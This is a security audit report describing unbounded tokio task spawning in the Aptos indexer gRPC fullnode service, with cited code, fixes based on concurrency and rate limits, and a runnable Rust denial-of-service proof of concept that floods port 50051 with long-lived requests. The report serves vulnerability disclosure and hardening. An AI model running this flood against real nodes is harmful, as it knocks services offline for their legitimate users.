# Audit Report

## Title
Unbounded Task Spawning in Indexer gRPC Fullnode Service Enables Resource Exhaustion DoS

## Summary
The `get_transactions_from_node()` function in the indexer gRPC fullnode service spawns a new tokio task for every incoming request without any concurrency limits, connection limits, or rate limiting. An attacker can send a large number of concurrent gRPC requests to exhaust the tokio runtime thread pool, memory, and CPU resources, causing service degradation or complete denial of service for the indexer endpoint.

## Finding Description

The vulnerability exists in the indexer gRPC fullnode service's request handler. When a client calls `GetTransactionsFromNode`, the service spawns an unbounded async task without any mechanism to limit concurrent requests. [1](#0-0) 

Each spawned task creates an `IndexerStreamCoordinator` that itself spawns additional tasks:
- Up to `processor_task_count` (default 20) tokio::spawn tasks for fetching transaction batches [2](#0-1) 

- Multiple tokio::spawn_blocking tasks for CPU-bound transaction conversion work [3](#0-2) 

The gRPC server setup provides no concurrency limits: [4](#0-3) 

No tower middleware with `concurrency_limit` is applied, and the `TcpIncoming` configuration lacks connection limits. The default configuration values allow this resource multiplication: [5](#0-4) 

**Attack Scenario:**
1. Attacker identifies the indexer gRPC endpoint (default port 50051)
2. Attacker sends N concurrent `GetTransactionsFromNode` requests with large `transactions_count` values
3. Each request spawns: 1 main task + up to 20 fetch tasks + M blocking tasks
4. With N=1000 requests: ~1000 main tasks + ~20,000 fetch tasks + thousands of blocking tasks
5. Tokio runtime becomes saturated, memory consumption spikes from channel buffers and transaction data
6. Service becomes unresponsive to legitimate indexer clients

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program under the category "API crashes" and "Validator node slowdowns."

**Impact:**
- **Service Degradation**: The indexer gRPC service becomes slow or unresponsive
- **Indexer Ecosystem Impact**: All downstream indexers depending on this endpoint cannot sync blockchain data
- **Fullnode Resource Exhaustion**: Memory, CPU, and thread pool resources are exhausted
- **Cascading Failures**: Database connection pool exhaustion, blocked I/O operations

While this doesn't directly affect consensus (the indexer service is separate from consensus operations), it affects the critical data availability layer that the Aptos ecosystem relies on. Fullnodes running this service can become degraded, impacting their ability to serve API requests and potentially affecting state sync performance.

## Likelihood Explanation

**Likelihood: High**

The attack is trivially easy to execute:
- No authentication required for the gRPC endpoint (designed to be public)
- Standard gRPC clients can send concurrent requests (HTTP/2 multiplexing)
- No rate limiting, IP blocking, or concurrency controls by default
- Attacker only needs network access to port 50051

**Attacker Requirements:**
- Minimal: Access to the gRPC endpoint URL and a gRPC client library
- No special privileges, credentials, or validator access needed
- Attack can be automated and sustained

**Exploitation Complexity:** Very Low - a simple script with concurrent gRPC calls suffices.

## Recommendation

Implement multiple layers of concurrency and rate limiting:

**1. Application-Level Concurrency Limiting:**
Add tower middleware to limit concurrent requests:

```rust
use tower::ServiceBuilder;
use tower::limit::ConcurrencyLimitLayer;

// In runtime.rs bootstrap function, modify the server setup:
let router = Server::builder()
    .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
    .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
    .layer(ConcurrencyLimitLayer::new(100)) // Limit to 100 concurrent requests
    .add_service(reflection_service_clone);
```

**2. Add Configuration for Limits:**
Extend `IndexerGrpcConfig` to include concurrency limits:

```rust
// In config/src/config/indexer_grpc_config.rs
pub struct IndexerGrpcConfig {
    // ... existing fields ...
    pub max_concurrent_requests: usize,
    pub request_rate_limit_per_second: usize,
}
```

**3. Implement Per-IP Rate Limiting:**
Add rate limiting middleware to prevent single-source flooding:

```rust
use tower::limit::RateLimitLayer;

let rate_limit = RateLimitLayer::new(
    100, // requests
    Duration::from_secs(1), // per second
);
```

**4. Add Connection Limits at TCP Level:**
Configure TCP accept limits in the listener setup.

**5. Documentation:**
Document that production deployments should use a reverse proxy (HAProxy/Nginx) with connection and rate limits before the indexer gRPC service.

## Proof of Concept

```rust
// PoC: Resource exhaustion via concurrent requests
// Run against a local indexer-grpc-fullnode instance

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio::task::JoinSet;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to local indexer-grpc-fullnode
    let endpoint = "http://127.0.0.1:50051";
    
    let concurrent_requests = 500; // Spawn 500 concurrent requests
    let mut join_set = JoinSet::new();
    
    println!("Starting DoS attack with {} concurrent requests...", concurrent_requests);
    
    for i in 0..concurrent_requests {
        let endpoint = endpoint.to_string();
        join_set.spawn(async move {
            let mut client = FullnodeDataClient::connect(endpoint)
                .await
                .expect("Failed to connect");
            
            // Request a large range of transactions
            let request = GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: Some(1_000_000), // Request 1M transactions
            };
            
            println!("Spawning request {}", i);
            
            // Start streaming - this will spawn tasks on the server
            let mut stream = client
                .get_transactions_from_node(request)
                .await
                .expect("Failed to start stream")
                .into_inner();
            
            // Don't actually consume the stream, just let it run
            // This keeps the server-side task alive
            tokio::time::sleep(tokio::time::Duration::from_secs(300)).await;
        });
    }
    
    println!("All requests spawned. Waiting...");
    
    // Wait for all tasks (they'll run for 5 minutes)
    while let Some(_) = join_set.join_next().await {}
    
    println!("Attack complete. Check server resource usage.");
    
    Ok(())
}
```

**Expected Result:**
- Server memory usage increases dramatically (multiple GB)
- CPU usage spikes to 100% across all cores
- Tokio runtime thread pool saturated
- Legitimate indexer requests time out or fail
- Server may become unresponsive and require restart

**To verify:**
1. Start a local indexer-grpc-fullnode with monitoring
2. Run the PoC
3. Monitor server metrics (CPU, memory, open file descriptors, tokio task count)
4. Observe service degradation and resource exhaustion

## Notes

The vulnerability is exacerbated by the default configuration allowing each request to spawn up to 20 additional fetch tasks. With the default `processor_task_count` of 20, a single request can spawn 21+ tasks. With 500 concurrent requests, this creates over 10,000 tasks competing for resources.

The HAProxy configurations found in the repository do not protect the indexer gRPC port (50051), only covering the P2P network, REST API, and metrics endpoints. Production deployments should add explicit protection for this endpoint.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-101)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
        let processor_task_count = self.service_context.processor_task_count;
        let processor_batch_size = self.service_context.processor_batch_size;
        let output_batch_size = self.service_context.output_batch_size;
        let transaction_channel_size = self.service_context.transaction_channel_size;
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };

        // Some node metadata
        let context = self.service_context.context.clone();
        let ledger_chain_id = context.chain_id().id();

        // Creates a channel to send the stream to the client.
        let (tx, rx) = mpsc::channel(transaction_channel_size);

        // Creates a moving average to track tps
        let mut ma = MovingAverage::new(10_000);

        let abort_handle = self.abort_handle.clone();
        // This is the main thread handling pushing to the stream
        tokio::spawn(async move {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L166-201)
```rust
        let mut tasks = vec![];
        for batch in task_batches {
            let context = self.context.clone();
            let filter = filter.clone();
            let task = tokio::task::spawn_blocking(move || {
                let raw_txns = batch;
                let api_txns = Self::convert_to_api_txns(context, raw_txns);
                let pb_txns = Self::convert_to_pb_txns(api_txns);
                // Apply filter if present.
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
                let mut responses = vec![];
                // Wrap in stream response object and send to channel
                for chunk in pb_txns.chunks(output_batch_size as usize) {
                    for chunk in chunk_transactions(chunk.to_vec(), MESSAGE_SIZE_LIMIT) {
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
                        responses.push(item);
                    }
                }
                responses
            });
            tasks.push(task);
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L242-252)
```rust
    async fn fetch_transactions_from_storage(&mut self) -> Vec<(TransactionOnChainData, usize)> {
        let batches = self.get_batches().await;
        let mut storage_fetch_tasks = vec![];
        let ledger_version = self.highest_known_version;
        for batch in batches {
            let context = self.context.clone();
            let task = tokio::spawn(async move {
                Self::fetch_raw_txns_with_retries(context.clone(), ledger_version, batch).await
            });
            storage_fetch_tasks.push(task);
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-131)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
            true => {
                let svc = RawDataServer::new(localnet_data_server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
        };

        let listener = TcpListener::bind(address).await.unwrap();
        if let Some(port_tx) = port_tx {
            port_tx.send(listener.local_addr().unwrap().port()).unwrap();
        }
        let incoming = TcpIncoming::from_listener(listener, false, None).unwrap();

        // Make port into a config
        router.serve_with_incoming(incoming).await.unwrap();

```

**File:** config/src/config/indexer_grpc_config.rs (L17-29)
```rust
const DEFAULT_PROCESSOR_BATCH_SIZE: u16 = 1000;
const DEFAULT_OUTPUT_BATCH_SIZE: u16 = 100;
const DEFAULT_TRANSACTION_CHANNEL_SIZE: usize = 35;
pub const DEFAULT_GRPC_STREAM_PORT: u16 = 50051;
const DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES: usize = 10_000;

pub fn get_default_processor_task_count(use_data_service_interface: bool) -> u16 {
    if use_data_service_interface {
        1
    } else {
        20
    }
}
```
